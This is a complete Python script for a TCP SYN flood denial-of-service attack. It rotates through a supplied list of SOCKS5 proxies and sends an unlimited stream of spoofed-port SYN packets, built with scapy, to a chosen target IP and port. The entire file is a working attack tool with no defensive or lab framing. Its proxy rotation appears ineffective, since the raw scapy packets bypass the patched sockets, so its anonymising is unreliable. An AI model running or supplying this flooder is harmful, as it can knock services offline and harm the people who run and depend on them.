from scapy.all import IP, TCP, send
import socks
import socket
import argparse
import random
import time

def load_proxies(file_path):
    proxies = []
    with open(file_path, 'r') as file:
        for line in file:
            proxy = line.strip().split(":")
            if len(proxy) == 2:
                proxies.append((proxy[0], int(proxy[1])))
    return proxies

def set_proxy(proxy_ip, proxy_port):
    socks.set_default_proxy(socks.SOCKS5, proxy_ip, proxy_port)
    socket.socket = socks.socksocket

def syn_flood_with_proxies(proxies, target_ip, target_port, packet_count, delay):
    packet_sent = 0
    proxy_index = 0
    try:
        while packet_count == -1 or packet_sent < packet_count:
            proxy_ip, proxy_port = proxies[proxy_index]
            set_proxy(proxy_ip, proxy_port)
            source_port = random.randint(1024, 65535)
            packet = IP(dst=target_ip) / TCP(sport=source_port, dport=target_port, flags="S")
            try:
                send(packet, verbose=False)
                packet_sent += 1
            except:
                pass
            proxy_index = (proxy_index + 1) % len(proxies)
            if delay > 0:
                time.sleep(delay)
    except KeyboardInterrupt:
        pass

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("proxy_list", help="File with proxies in ip:port format")
    parser.add_argument("target_ip", help="Target IP address")
    parser.add_argument("target_port", type=int, help="Target port")
    parser.add_argument("-c", "--count", type=int, default=-1, help="Number of packets")
    parser.add_argument("-d", "--delay", type=float, default=0, help="Delay between packets")
    args = parser.parse_args()

    proxies = load_proxies(args.proxy_list)
    if not proxies:
        exit(1)

    syn_flood_with_proxies(proxies, args.target_ip, args.target_port, args.count, args.delay)
